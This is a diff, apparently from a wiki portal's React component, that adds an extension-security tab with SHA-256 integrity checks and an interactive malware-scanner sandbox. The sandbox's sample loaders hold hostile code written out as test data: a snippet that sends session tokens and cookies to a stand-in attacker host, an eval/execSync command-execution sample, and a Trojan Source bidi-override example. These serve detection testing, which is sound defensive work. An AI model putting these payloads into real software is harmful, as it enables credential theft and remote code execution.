@@ -40,7 +40,17 @@ import {
   Sparkles,
   ChevronRight,
   Trash2,
-  X
+  X,
+  Lock,
+  Unlock,
+  Bug,
+  FileCode,
+  Terminal,
+  AlertOctagon,
+  ShieldAlert,
+  ShieldCheck,
+  Check,
+  Cpu
 } from 'lucide-react';
 import jsPDF from 'jspdf';
 import {
@@ -48,9 +58,17 @@ import {
   WikiRevision,
   WikiEvent,
   WikiExtension,
+  ExtensionFile,
+  ExtensionSecurityThreat,
+  ExtensionSecurityAudit,
+  ALLOWED_EXTENSION_DOMAINS,
   SEED_WIKI_EXTENSIONS,
   parseWikitextToHtml,
   computeWikitextDiff,
+  computeSha256Hex,
+  computeShannonEntropy,
+  scanExtensionCodeForMalware,
+  verifyExtensionSyncSecurity,
   ParseResult,
   DiffResult
 } from '../../data/notMediaWikiData';
@@ -59,7 +77,12 @@ import {
   saveWikiArticleInDb,
   deleteWikiArticleFromDb,
   listWikiRevisionsFromDb,
-  listWikiEventsFromDb
+  listWikiEventsFromDb,
+  verifyExtensionIntegrityWithFirestore,
+  registerExtensionHashInFirestore,
+  executeExtensionSafely,
+  loadAndVerifyAllExtensionsFromDb,
+  ExtensionIntegrityCheckResult
 } from '../../firebase';
 import { stripHtmlToPlainText } from '../../utils/text';
 
@@ -100,6 +123,272 @@ export default function NotMediaWikiPortal({ currentUser, showToast }: NotMediaW
 
   // PDF Generation State
   const [isExportingPdf, setIsExportingPdf] = useState<boolean>(false);
+
+  // Extension Security & Forensic Analysis States (Dispositivos 3.05.9.a & 3.05.9.b)
+  const [isSyncingExtensions, setIsSyncingExtensions] = useState<boolean>(false);
+  const [syncFeedback, setSyncFeedback] = useState<{
+    success: boolean;
+    message: string;
+    status?: string;
+    reasons?: string[];
+    audit?: ExtensionSecurityAudit;
+  } | null>(null);
+  const [inspectingExtension, setInspectingExtension] = useState<WikiExtension | null>(null);
+  const [inspectingFile, setInspectingFile] = useState<ExtensionFile | null>(null);
+
+  // Real-time Forensic Scanner Sandbox States (Dispositivo 3.05.9.b)
+  const [forensicFileName, setForensicFileName] = useState<string>('extension_hook.ts');
+  const [forensicCode, setForensicCode] = useState<string>(
+    `// Exemplo de Extensão NotMediaWiki\nexport function onArticleRender(content: string): string {\n  return content.replace(/NOTICIA_URGENTE/g, '🚨 Plantão Especial WazzimaGiygg');\n}`
+  );
+  const [forensicAudit, setForensicAudit] = useState<ExtensionSecurityAudit | null>(null);
+  const [isScanningForensic, setIsScanningForensic] = useState<boolean>(false);
+
+  const [firestoreIntegrityMap, setFirestoreIntegrityMap] = useState<Record<string, ExtensionIntegrityCheckResult>>({});
+  const [executionTestResult, setExecutionTestResult] = useState<{
+    success: boolean;
+    message: string;
+    check?: ExtensionIntegrityCheckResult;
+  } | null>(null);
+
+  const isBureaucrat = currentUser?.email?.toLowerCase() === 'pedrohenriquecardonaperes@gmail.com';
+
+  // Verify all extensions with Firestore integrity registry
+  const refreshFirestoreIntegrity = async (extList: WikiExtension[]) => {
+    try {
+      const results: Record<string, ExtensionIntegrityCheckResult> = {};
+      for (const ext of extList) {
+        const check = await verifyExtensionIntegrityWithFirestore(ext);
+        results[ext.id] = check;
+      }
+      setFirestoreIntegrityMap(results);
+    } catch (err) {
+      console.warn('Erro ao verificar integridade no Firestore:', err);
+    }
+  };
+
+  // Load extensions from backend API and verify against Firestore hashes
+  const loadExtensionsFromApi = async () => {
+    try {
+      const res = await fetch('/api/v1/extensions');
+      if (res.ok) {
+        const data = await res.json();
+        if (data.extensions && Array.isArray(data.extensions)) {
+          setExtensions(data.extensions);
+          refreshFirestoreIntegrity(data.extensions);
+        }
+      }
+    } catch (err) {
+      console.warn('Erro ao carregar extensões do servidor:', err);
+    }
+  };
+
+  useEffect(() => {
+    loadExtensionsFromApi();
+  }, []);
+
+  // Synchronize all extensions with security device & Firestore Registry
+  const handleSyncAllExtensions = async () => {
+    if (!isBureaucrat) {
+      showToast('Apenas o Burocrata oficial (pedrohenriquecardonaperes@gmail.com) tem permissão para sincronizar extensões.', true);
+      return;
+    }
+
+    setIsSyncingExtensions(true);
+    setSyncFeedback(null);
+    let successCount = 0;
+    let quarantinedCount = 0;
+    const errors: string[] = [];
+
+    try {
+      for (const ext of extensions) {
+        // 1. Sync with backend gateway
+        const res = await fetch('/api/v1/extensions/security/sync', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            extension: ext,
+            userEmail: currentUser?.email
+          })
+        });
+
+        // 2. Register authorized hash in Firestore
+        await registerExtensionHashInFirestore(ext, currentUser?.email);
+
+        // 3. Verify downloaded integrity against Firestore record
+        const integrityCheck = await verifyExtensionIntegrityWithFirestore(ext);
+
+        const data = await res.json();
+        if (data.success && integrityCheck.valid) {
+          successCount++;
+        } else {
+          if (data.status === 'quarantined' || integrityCheck.status === 'quarantined') quarantinedCount++;
+          if (integrityCheck.errors.length > 0) {
+            errors.push(`${ext.name}: ${integrityCheck.errors.join('; ')}`);
+          } else if (data.reasons && data.reasons.length > 0) {
+            errors.push(`${ext.name}: ${data.reasons.join('; ')}`);
+          } else if (data.error) {
+            errors.push(`${ext.name}: ${data.error}`);
+          }
+        }
+      }
+
+      await loadExtensionsFromApi();
+
+      if (errors.length === 0) {
+        setSyncFeedback({
+          success: true,
+          message: `Sincronia criptográfica e hashes no Firestore validados com sucesso! ${successCount} extensões assinadas por ${currentUser?.email}.`
+        });
+        showToast('Extensões sincronizadas e validadas com hashes no Firestore.');
+      } else {
+        setSyncFeedback({
+          success: false,
+          message: `Sincronia concluída com alertas: ${successCount} íntegras no Firestore, ${quarantinedCount} em quarentena preventiva.`,
+          reasons: errors
+        });
+        showToast('Sincronia de extensões processada com quarentena/alertas.', true);
+      }
+    } catch (err: any) {
+      setSyncFeedback({
+        success: false,
+        message: `Falha de comunicação com o gateway de segurança: ${err.message}`
+      });
+      showToast('Erro ao sincronizar extensões com o Firestore.', true);
+    } finally {
+      setIsSyncingExtensions(false);
+    }
+  };
+
+  // Toggle extension state (Guarded by Bureaucrat, Quarantine & Firestore Hash Integrity)
+  const handleToggleExtension = async (ext: WikiExtension) => {
+    if (!isBureaucrat) {
+      showToast('Apenas o Burocrata oficial (pedrohenriquecardonaperes@gmail.com) pode ativar ou desativar extensões.', true);
+      return;
+    }
+
+    if (ext.quarantined && !ext.enabled) {
+      showToast('BLOQUEIO: Esta extensão está em QUARENTENA preventiva e não pode ser ativada.', true);
+      return;
+    }
+
+    // Verify integrity against Firestore BEFORE execution/activation
+    const integrity = await verifyExtensionIntegrityWithFirestore(ext);
+    if (!ext.enabled && (!integrity.canExecute || !integrity.valid)) {
+      showToast(
+        `BLOQUEIO DE INTEGRIDADE: A extensão falhou na validação de hash com o Firestore (${integrity.status}). ${integrity.errors[0] || ''}`,
+        true
+      );
+      return;
+    }
+
+    try {
+      const res = await fetch(`/api/v1/extensions/${ext.id}/toggle`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          enabled: !ext.enabled,
+          userEmail: currentUser?.email
+        })
+      });
+
+      const data = await res.json();
+      if (!res.ok) {
+        showToast(data.error || 'Erro ao alterar estado da extensão.', true);
+        return;
+      }
+
+      setExtensions(prev => prev.map(e => e.id === ext.id ? { ...e, enabled: !ext.enabled } : e));
+      showToast(`Extensão "${ext.name}" ${!ext.enabled ? 'ativada' : 'desativada'} com sucesso.`);
+    } catch (err: any) {
+      showToast(`Erro na requisição: ${err.message}`, true);
+    }
+  };
+
+  // Safe Execution Sandbox Simulator with Firestore Integrity Validation
+  const handleTestSafeExecution = async (ext: WikiExtension) => {
+    setExecutionTestResult(null);
+    const testRun = await executeExtensionSafely(ext, () => {
+      return `Módulo [${ext.namePt}] executado com sucesso: validação de hash e assinatura no Firestore confirmada!`;
+    });
+
+    if (testRun.success) {
+      setExecutionTestResult({
+        success: true,
+        message: testRun.result || 'Execução autorizada pelo Firestore!',
+        check: testRun.integrity
+      });
+      showToast('Assinatura e hash validados no Firestore! Execução autorizada.');
+    } else {
+      setExecutionTestResult({
+        success: false,
+        message: testRun.error || 'Execução abortada por falha de integridade no Firestore.',
+        check: testRun.integrity
+      });
+      showToast('Execução bloqueada por divergência de hash no Firestore.', true);
+    }
+  };
+
+  // Run Forensic Malware Scan (Dispositivo 3.05.9.b)
+  const handleRunForensicScan = async () => {
+    if (!forensicCode.trim()) {
+      showToast('Insira código para verificação antimalware.', true);
+      return;
+    }
+
+    setIsScanningForensic(true);
+    try {
+      const localAudit = scanExtensionCodeForMalware('custom-sandbox', forensicFileName, forensicCode);
+      setForensicAudit(localAudit);
+
+      // Also submit to backend
+      const res = await fetch('/api/v1/extensions/security/scan', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          fileName: forensicFileName,
+          code: forensicCode
+        })
+      });
+
+      if (res.ok) {
+        const data = await res.json();
+        if (data.audit) {
+          setForensicAudit(data.audit);
+        }
+      }
+
+      if (localAudit.threatLevel === 'CRITICAL' || localAudit.quarantined) {
+        showToast('ALERTA: Código classificado como CRÍTICO! Quarentena preventiva disparada.', true);
+      } else if (localAudit.threatLevel === 'MEDIUM_RISK' || localAudit.threatLevel === 'LOW_RISK') {
+        showToast('Avisos de segurança encontrados no código examinado.');
+      } else {
+        showToast('Código auditado: 100% íntegro e em conformidade.');
+      }
+    } catch (err: any) {
+      showToast(`Erro no analisador forense: ${err.message}`, true);
+    } finally {
+      setIsScanningForensic(false);
+    }
+  };
+
+  // Forensic Sample Payloads
+  const loadForensicSample = (sampleType: 'safe' | 'exfil' | 'rce' | 'trojan') => {
+    if (sampleType === 'safe') {
+      setForensicFileName('clean_parser_hook.ts');
+      setForensicCode(`// Extensão Legítima NotMediaWiki\n// Autor: WazzimaGiygg Research\nexport function registerCustomWikitextTag(tag: string, handler: (content: string) => string) {\n  const tagRegistry = new Map<string, (c: string) => string>();\n  tagRegistry.set(tag, handler);\n  return {\n    success: true,\n    tagCount: tagRegistry.size\n  };\n}`);
+    } else if (sampleType === 'exfil') {
+      setForensicFileName('malicious_stealer.ts');
+      setForensicCode(`// AMEACA: Exfiltração de Credenciais & Tokens de Sessão\nfunction stealUserSession() {\n  const userToken = localStorage.getItem('auth_token') || document.cookie;\n  fetch('https://evil-hacker-tracker.xyz/exfiltrate', {\n    method: 'POST',\n    body: JSON.stringify({ token: userToken, target: 'pedrohenriquecardonaperes@gmail.com' })\n  });\n}`);
+    } else if (sampleType === 'rce') {
+      setForensicFileName('rce_obfuscated_eval.ts');
+      setForensicCode(`// AMEACA: Execução Dinâmica Proibida & Sequência Hex Ofuscada\nconst _0x1a2b = "\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73";\nconst dynamicExec = new Function("cmd", "eval(cmd)");\ndynamicExec("require('child_process').execSync('id')");`);
+    } else if (sampleType === 'trojan') {
+      setForensicFileName('trojan_source_bidi.ts');
+      // Contains Trojan Source Bidi Unicode character
+      setForensicCode(`// AMEACA: Trojan Source Bidi Override (CVE-2021-42574)\nconst isAuthorized = false; /*\u202E } \u2066if (isAuthorized)\u2069 \u2066*/\nconsole.log("Acesso concedido indevidamente!");`);
+    }
+  };
 
   // Load articles from Firestore & Backend Database
   useEffect(() => {
@@ -581,7 +870,7 @@ export default function NotMediaWikiPortal({ currentUser, showToast }: NotMediaW
             { id: 'history', label: 'Histórico & Diff', icon: GitCompare },
             { id: 'events', label: 'EventStreams ao Vivo', icon: Zap },
             { id: 'special', label: 'Páginas Especiais', icon: List },
-            { id: 'extensions', label: 'Extensões (6)', icon: Layers },
+            { id: 'extensions', label: `Extensões & Segurança (${extensions.length})`, icon: ShieldCheck },
             { id: 'governance', label: 'Governança & ArbCom', icon: Shield }
           ].map((tab) => {
             const Icon = tab.icon;
@@ -1357,50 +1646,662 @@ export default function NotMediaWikiPortal({ currentUser, showToast }: NotMediaW
       )}
 
       {/* ===================================================================== */}
-      {/* TAB 7: EXTENSÕES (EXTENSIONS MANAGER)                                 */}
+      {/* TAB 7: EXTENSÕES & DISPOSITIVOS DE SEGURANÇA (3.05.9.a & 3.05.9.b)    */}
       {/* ===================================================================== */}
       {activeTab === 'extensions' && (
-        <div className="bg-white border-2 border-[#141414] p-6 shadow-[6px_6px_0px_0px_rgba(20,20,20,1)] space-y-4">
-          <div className="border-b-2 border-[#141414] pb-4">
-            <h3 className="font-editorial text-2xl font-bold text-stone-950 flex items-center gap-2">
-              <Layers className="w-6 h-6 text-purple-700" />
-              <span>Gerenciador de Extensões NotMediaWiki</span>
-            </h3>
-            <p className="text-xs font-mono text-stone-600 mt-1">
-              Extensões e módulos de parser integrados à arquitetura desacoplada do Wiki.
-            </p>
+        <div className="bg-white border-2 border-[#141414] p-6 shadow-[6px_6px_0px_0px_rgba(20,20,20,1)] space-y-6">
+          {/* Header & Device Status */}
+          <div className="border-b-2 border-[#141414] pb-4 flex flex-col md:flex-row md:items-center justify-between gap-4">
+            <div>
+              <div className="flex items-center gap-2">
+                <ShieldCheck className="w-6 h-6 text-emerald-700" />
+                <h3 className="font-editorial text-2xl font-bold text-stone-950">
+                  Gerenciador de Extensões & Dispositivos de Segurança
+                </h3>
+              </div>
+              <p className="text-xs font-mono text-stone-600 mt-1">
+                Conformidade com os dispositivos de sincronia criptográfica (3.05.9.a) e verificação forense antimalware (3.05.9.b).
+              </p>
+            </div>
+
+            <div className="flex items-center gap-2">
+              <button
+                onClick={handleSyncAllExtensions}
+                disabled={isSyncingExtensions}
+                className="px-3.5 py-2 bg-stone-900 text-white hover:bg-stone-800 text-xs font-mono font-bold uppercase tracking-wider flex items-center gap-2 border-2 border-black shadow-[3px_3px_0px_0px_rgba(0,0,0,1)] active:translate-x-0.5 active:translate-y-0.5 disabled:opacity-60 cursor-pointer"
+                title={!isBureaucrat ? 'Exclusivo para o Burocrata pedrohenriquecardonaperes@gmail.com' : 'Sincronizar e validar integridade'}
+              >
+                <RefreshCw className={`w-3.5 h-3.5 ${isSyncingExtensions ? 'animate-spin' : ''}`} />
+                <span>{isSyncingExtensions ? 'Validando Integridade...' : 'Sincronizar com Dispositivo de Segurança'}</span>
+              </button>
+            </div>
           </div>
 
+          {/* Security Device Information Cards */}
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs">
-            {extensions.map((ext) => (
-              <div key={ext.id} className="p-4 border-2 border-stone-300 bg-[#FAF9F5] flex flex-col justify-between">
-                <div>
-                  <div className="flex items-center justify-between mb-2">
-                    <span className="bg-stone-900 text-white font-bold px-2 py-0.5 text-[9px] uppercase">
-                      {ext.category}
+            {/* Dispositivo 3.05.9.a */}
+            <div className="p-4 bg-emerald-50/70 border-2 border-emerald-600 shadow-[3px_3px_0px_0px_rgba(5,150,105,1)]">
+              <div className="flex items-center justify-between mb-2">
+                <span className="font-bold text-emerald-900 uppercase text-[10px] flex items-center gap-1.5">
+                  <Shield className="w-3.5 h-3.5 text-emerald-700" /> Dispositivo 3.05.9.a
+                </span>
+                <span className="bg-emerald-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase">
+                  Sincronia Criptográfica Ativa
+                </span>
+              </div>
+              <h4 className="font-editorial text-base font-bold text-stone-950">
+                Dispositivo de Segurança para Sincronia de Extensões
+              </h4>
+              <ul className="mt-2 space-y-1 text-stone-700 text-[11px] list-disc list-inside">
+                <li>Validação de assinatura SHA-256 NIST FIPS 180-4 em tempo real.</li>
+                <li>Restrição estrita à Whitelist oficial ({ALLOWED_EXTENSION_DOMAINS.length} domínios autorizados).</li>
+                <li>Autoridade criptográfica exclusiva: <strong className="text-stone-900">pedrohenriquecardonaperes@gmail.com</strong>.</li>
+              </ul>
+            </div>
+
+            {/* Dispositivo 3.05.9.b */}
+            <div className="p-4 bg-purple-50/70 border-2 border-purple-600 shadow-[3px_3px_0px_0px_rgba(147,51,234,1)]">
+              <div className="flex items-center justify-between mb-2">
+                <span className="font-bold text-purple-900 uppercase text-[10px] flex items-center gap-1.5">
+                  <Bug className="w-3.5 h-3.5 text-purple-700" /> Dispositivo 3.05.9.b
+                </span>
+                <span className="bg-purple-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase">
+                  Varredura Antimalware Ativa
+                </span>
+              </div>
+              <h4 className="font-editorial text-base font-bold text-stone-950">
+                Dispositivo de Verificação de Informações Maliciosas
+              </h4>
+              <ul className="mt-2 space-y-1 text-stone-700 text-[11px] list-disc list-inside">
+                <li>Análise estática contra RCE, eval(), execSync e Trojan Source (Bidi).</li>
+                <li>Mitigação de exfiltração de tokens/cookies e poluição de protótipo.</li>
+                <li>Quarentena preventiva automática e cálculo de Entropia de Shannon.</li>
+              </ul>
+            </div>
+          </div>
+
+          {/* Sync Feedback Alert */}
+          {syncFeedback && (
+            <div
+              className={`p-4 border-2 font-mono text-xs ${
+                syncFeedback.success
+                  ? 'bg-emerald-50 border-emerald-600 text-emerald-950 shadow-[3px_3px_0px_0px_rgba(5,150,105,1)]'
+                  : 'bg-red-50 border-red-600 text-red-950 shadow-[3px_3px_0px_0px_rgba(220,38,38,1)]'
+              }`}
+            >
+              <div className="flex items-start justify-between gap-2">
+                <div className="flex items-center gap-2 font-bold">
+                  {syncFeedback.success ? (
+                    <CheckCircle className="w-4 h-4 text-emerald-700" />
+                  ) : (
+                    <AlertTriangle className="w-4 h-4 text-red-700" />
+                  )}
+                  <span>{syncFeedback.message}</span>
+                </div>
+                <button
+                  onClick={() => setSyncFeedback(null)}
+                  className="text-stone-500 hover:text-stone-900 cursor-pointer"
+                >
+                  <X className="w-4 h-4" />
+                </button>
+              </div>
+
+              {syncFeedback.reasons && syncFeedback.reasons.length > 0 && (
+                <ul className="mt-2 space-y-1 pl-6 list-disc text-[11px]">
+                  {syncFeedback.reasons.map((r, i) => (
+                    <li key={i}>{r}</li>
+                  ))}
+                </ul>
+              )}
+            </div>
+          )}
+
+          {/* Extension Cards Grid */}
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs">
+            {extensions.map((ext) => {
+              const isQuarantined = ext.quarantined || ext.signatureStatus === 'quarantined';
+              const isTampered = ext.signatureStatus === 'tampered';
+              const isVerified = ext.signatureStatus === 'verified' && !isQuarantined;
+
+              return (
+                <div
+                  key={ext.id}
+                  className={`p-4 border-2 flex flex-col justify-between transition-all ${
+                    isQuarantined
+                      ? 'border-red-600 bg-red-50/50 shadow-[4px_4px_0px_0px_rgba(220,38,38,1)]'
+                      : isTampered
+                      ? 'border-amber-600 bg-amber-50/50 shadow-[4px_4px_0px_0px_rgba(217,119,6,1)]'
+                      : 'border-stone-300 bg-[#FAF9F5] shadow-[4px_4px_0px_0px_rgba(0,0,0,0.1)]'
+                  }`}
+                >
+                  <div>
+                    {/* Badges Bar */}
+                    <div className="flex items-center justify-between mb-2 gap-2 flex-wrap">
+                      <div className="flex items-center gap-1.5">
+                        <span className="bg-stone-900 text-white font-bold px-2 py-0.5 text-[9px] uppercase">
+                          {ext.category}
+                        </span>
+                        <span className="bg-stone-200 text-stone-800 font-bold px-1.5 py-0.5 text-[9px]">
+                          v{ext.version}
+                        </span>
+                      </div>
+
+                      {/* Security Status Badge */}
+                      {isQuarantined ? (
+                        <span className="bg-red-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase flex items-center gap-1">
+                          <AlertOctagon className="w-3 h-3" /> Quarentena (Malware)
+                        </span>
+                      ) : isTampered ? (
+                        <span className="bg-amber-600 text-white font-bold px-2 py-0.5 text-[9px] uppercase flex items-center gap-1">
+                          <AlertTriangle className="w-3 h-3" /> Digest Adulterado
+                        </span>
+                      ) : (
+                        <span className="bg-emerald-700 text-white font-bold px-2 py-0.5 text-[9px] uppercase flex items-center gap-1">
+                          <ShieldCheck className="w-3 h-3" /> SHA-256 Verificado
+                        </span>
+                      )}
+                    </div>
+
+                    <h4 className="font-editorial text-lg font-bold text-stone-950 flex items-center justify-between">
+                      <span>{ext.namePt}</span>
+                      <span className={`text-[10px] font-mono px-2 py-0.5 border ${
+                        ext.enabled
+                          ? 'bg-emerald-100 border-emerald-500 text-emerald-900 font-bold'
+                          : 'bg-stone-200 border-stone-400 text-stone-600'
+                      }`}>
+                        {ext.enabled ? 'ATIVADA' : 'DESATIVADA'}
+                      </span>
+                    </h4>
+
+                    <p className="font-serif text-xs text-stone-600 mt-1 leading-relaxed">
+                      {ext.description}
+                    </p>
+
+                    {/* Cryptographic Manifest Information */}
+                    <div className="mt-3 p-2.5 bg-stone-100 border border-stone-300 text-[10px] space-y-1">
+                      <div className="flex items-center justify-between">
+                        <span className="text-stone-500 font-bold">DIGEST SHA-256:</span>
+                        <span className="font-mono text-stone-900 font-bold">{ext.sha256?.slice(0, 16)}...</span>
+                      </div>
+                      <div className="flex items-center justify-between">
+                        <span className="text-stone-500 font-bold">ORIGEM NA WHITELIST:</span>
+                        <span className="text-emerald-800 font-bold flex items-center gap-1">
+                          <Check className="w-3 h-3" /> {ext.originDomain}
+                        </span>
+                      </div>
+                      <div className="flex items-center justify-between">
+                        <span className="text-stone-500 font-bold">AUDITORIA DE SEGURANÇA:</span>
+                        <span className={`font-bold ${ext.securityAudit?.safetyScore && ext.securityAudit.safetyScore >= 90 ? 'text-emerald-700' : 'text-amber-700'}`}>
+                          Score: {ext.securityAudit?.safetyScore ?? 100}/100 ({ext.securityAudit?.threatLevel ?? 'SECURE'})
+                        </span>
+                      </div>
+                      <div className="flex items-center justify-between border-t border-stone-200 pt-1 mt-1">
+                        <span className="text-stone-500 font-bold">INTEGRIDADE NO FIRESTORE:</span>
+                        {firestoreIntegrityMap[ext.id]?.valid ? (
+                          <span className="text-emerald-700 font-bold flex items-center gap-1">
+                            <Check className="w-3 h-3" /> Hash & Assinatura Íntegras
+                          </span>
+                        ) : firestoreIntegrityMap[ext.id]?.status === 'tampered' ? (
+                          <span className="text-red-700 font-bold flex items-center gap-1">
+                            <AlertOctagon className="w-3 h-3" /> Divergência de Hash!
+                          </span>
+                        ) : firestoreIntegrityMap[ext.id]?.status === 'quarantined' ? (
+                          <span className="text-red-700 font-bold flex items-center gap-1">
+                            <Lock className="w-3 h-3" /> Bloqueada no Firestore
+                          </span>
+                        ) : (
+                          <span className="text-stone-600 font-bold flex items-center gap-1">
+                            <RefreshCw className="w-3 h-3 animate-spin" /> Verificando...
+                          </span>
+                        )}
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Actions & Status Controls */}
+                  <div className="pt-3 border-t border-stone-200 mt-3 flex items-center justify-between text-[10px]">
+                    <button
+                      onClick={() => {
+                        setInspectingExtension(ext);
+                        setInspectingFile(ext.files?.[0] || null);
+                      }}
+                      className="px-2.5 py-1.5 bg-stone-200 hover:bg-stone-300 text-stone-900 font-bold border border-stone-400 flex items-center gap-1.5 cursor-pointer"
+                    >
+                      <FileCode className="w-3.5 h-3.5 text-stone-700" />
+                      <span>Inspecionar Arquivos ({ext.files?.length || 1})</span>
+                    </button>
+
+                    <div className="flex items-center gap-2">
+                      <button
+                        onClick={() => handleToggleExtension(ext)}
+                        disabled={!isBureaucrat || isQuarantined}
+                        className={`px-3 py-1.5 font-bold border flex items-center gap-1 cursor-pointer transition-colors ${
+                          isQuarantined
+                            ? 'bg-stone-200 text-stone-400 border-stone-300 cursor-not-allowed'
+                            : ext.enabled
+                            ? 'bg-amber-100 text-amber-900 border-amber-600 hover:bg-amber-200'
+                            : 'bg-emerald-600 text-white border-emerald-800 hover:bg-emerald-700'
+                        }`}
+                        title={
+                          !isBureaucrat
+                            ? 'Somente pedrohenriquecardonaperes@gmail.com pode alterar'
+                            : isQuarantined
+                            ? 'Extensão bloqueada por malware em quarentena'
+                            : ext.enabled
+                            ? 'Desativar extensão'
+                            : 'Ativar extensão'
+                        }
+                      >
+                        {isQuarantined ? (
+                          <>
+                            <Lock className="w-3 h-3" /> Quarentena
+                          </>
+                        ) : ext.enabled ? (
+                          <>
+                            <Unlock className="w-3 h-3" /> Desativar
+                          </>
+                        ) : (
+                          <>
+                            <Check className="w-3 h-3" /> Ativar
+                          </>
+                        )}
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              );
+            })}
+          </div>
+
+          {/* ===================================================================== */}
+          {/* DISPOSITIVO 3.05.9.b: VERIFICADOR FORENSE SANDBOX INTERATIVO          */}
+          {/* ===================================================================== */}
+          <div className="border-2 border-[#141414] bg-[#FAF9F5] p-5 shadow-[4px_4px_0px_0px_rgba(20,20,20,1)] space-y-4">
+            <div className="border-b-2 border-stone-300 pb-3 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+              <div>
+                <h4 className="font-editorial text-xl font-bold text-stone-950 flex items-center gap-2">
+                  <Terminal className="w-5 h-5 text-purple-700" />
+                  <span>Dispositivo 3.05.9.b: Verificador Forense de Código de Extensões</span>
+                </h4>
+                <p className="text-xs font-mono text-stone-600 mt-0.5">
+                  Análise estática profunda: detecção de RCE, Trojan Source, ofuscação e exfiltração em arquivos de extensões.
+                </p>
+              </div>
+
+              {/* Sample Loader Buttons */}
+              <div className="flex items-center gap-1.5 flex-wrap">
+                <span className="text-[10px] font-mono text-stone-500 font-bold mr-1">Carregar Amostras:</span>
+                <button
+                  onClick={() => loadForensicSample('safe')}
+                  className="px-2 py-1 bg-white hover:bg-emerald-50 text-emerald-800 border border-emerald-600 text-[10px] font-mono font-bold cursor-pointer"
+                >
+                  ✓ Segura
+                </button>
+                <button
+                  onClick={() => loadForensicSample('exfil')}
+                  className="px-2 py-1 bg-white hover:bg-red-50 text-red-700 border border-red-600 text-[10px] font-mono font-bold cursor-pointer"
+                >
+                  ⚠️ Exfiltração
+                </button>
+                <button
+                  onClick={() => loadForensicSample('rce')}
+                  className="px-2 py-1 bg-white hover:bg-amber-50 text-amber-800 border border-amber-600 text-[10px] font-mono font-bold cursor-pointer"
+                >
+                  ⚠️ RCE + Hex
+                </button>
+                <button
+                  onClick={() => loadForensicSample('trojan')}
+                  className="px-2 py-1 bg-white hover:bg-purple-50 text-purple-800 border border-purple-600 text-[10px] font-mono font-bold cursor-pointer"
+                >
+                  ⚠️ Trojan Source
+                </button>
+              </div>
+            </div>
+
+            {/* Code Input & File Name */}
+            <div className="space-y-2">
+              <div className="flex items-center gap-2">
+                <label className="text-[11px] font-mono font-bold text-stone-700">Arquivo Alvo:</label>
+                <input
+                  type="text"
+                  value={forensicFileName}
+                  onChange={(e) => setForensicFileName(e.target.value)}
+                  className="px-2 py-1 bg-white border border-stone-400 font-mono text-xs w-60"
+                  placeholder="ex: hook.ts ou extension.json"
+                />
+              </div>
+
+              <textarea
+                value={forensicCode}
+                onChange={(e) => setForensicCode(e.target.value)}
+                rows={7}
+                className="w-full p-3 font-mono text-xs bg-stone-900 text-stone-100 border-2 border-black focus:outline-none focus:ring-1 focus:ring-purple-600"
+                placeholder="Cole ou edite o código da extensão para submeter ao scanner antimalware..."
+              />
+            </div>
+
+            {/* Run Button */}
+            <div className="flex items-center justify-between">
+              <span className="text-[11px] font-mono text-stone-600">
+                Digest SHA-256 do código inserido: <strong className="text-stone-900">{computeSha256Hex(forensicCode).slice(0, 20)}...</strong>
+              </span>
+
+              <button
+                onClick={handleRunForensicScan}
+                disabled={isScanningForensic}
+                className="px-4 py-2 bg-purple-700 hover:bg-purple-800 text-white font-mono text-xs font-bold uppercase tracking-wider flex items-center gap-2 border-2 border-black shadow-[3px_3px_0px_0px_rgba(0,0,0,1)] active:translate-x-0.5 active:translate-y-0.5 cursor-pointer"
+              >
+                <Bug className={`w-4 h-4 ${isScanningForensic ? 'animate-spin' : ''}`} />
+                <span>{isScanningForensic ? 'Analisando Código...' : 'Executar Varredura Forense'}</span>
+              </button>
+            </div>
+
+            {/* Forensic Scan Audit Report Panel */}
+            {forensicAudit && (
+              <div className={`p-4 border-2 font-mono text-xs ${
+                forensicAudit.threatLevel === 'CRITICAL'
+                  ? 'bg-red-50 border-red-600 text-red-950 shadow-[3px_3px_0px_0px_rgba(220,38,38,1)]'
+                  : forensicAudit.threatLevel === 'MEDIUM_RISK'
+                  ? 'bg-amber-50 border-amber-600 text-amber-950 shadow-[3px_3px_0px_0px_rgba(217,119,6,1)]'
+                  : 'bg-emerald-50 border-emerald-600 text-emerald-950 shadow-[3px_3px_0px_0px_rgba(5,150,105,1)]'
+              }`}>
+                <div className="flex items-center justify-between pb-3 border-b border-stone-300">
+                  <div className="flex items-center gap-2">
+                    {forensicAudit.threatLevel === 'CRITICAL' ? (
+                      <AlertOctagon className="w-5 h-5 text-red-700" />
+                    ) : forensicAudit.threatLevel === 'MEDIUM_RISK' ? (
+                      <AlertTriangle className="w-5 h-5 text-amber-700" />
+                    ) : (
+                      <CheckCircle className="w-5 h-5 text-emerald-700" />
+                    )}
+                    <div>
+                      <span className="font-bold text-sm block">
+                        Relatório Forense de Conformidade (Dispositivo 3.05.9.b)
+                      </span>
+                      <span className="text-[10px] text-stone-600">
+                        Classificação de Risco: <strong>{forensicAudit.threatLevel}</strong> | Entropia de Shannon: <strong>{forensicAudit.entropyScore} bits/byte</strong>
+                      </span>
+                    </div>
+                  </div>
+
+                  <div className="text-right">
+                    <span className="text-xl font-bold font-editorial">
+                      {forensicAudit.safetyScore}/100
                     </span>
-                    <span className="text-emerald-700 font-bold text-[10px] flex items-center gap-1">
-                      <CheckCircle className="w-3 h-3" /> v{ext.version}
+                    <span className="block text-[9px] uppercase tracking-wider font-bold">
+                      Índice de Segurança
                     </span>
                   </div>
-                  <h4 className="font-editorial text-lg font-bold text-stone-950">{ext.namePt}</h4>
-                  <p className="font-serif text-xs text-stone-600 mt-1 leading-relaxed">{ext.description}</p>
                 </div>
 
-                <div className="pt-3 border-t border-stone-200 mt-3 flex items-center justify-between text-[10px] text-stone-500">
-                  <span>Autor: {ext.author}</span>
-                  <a
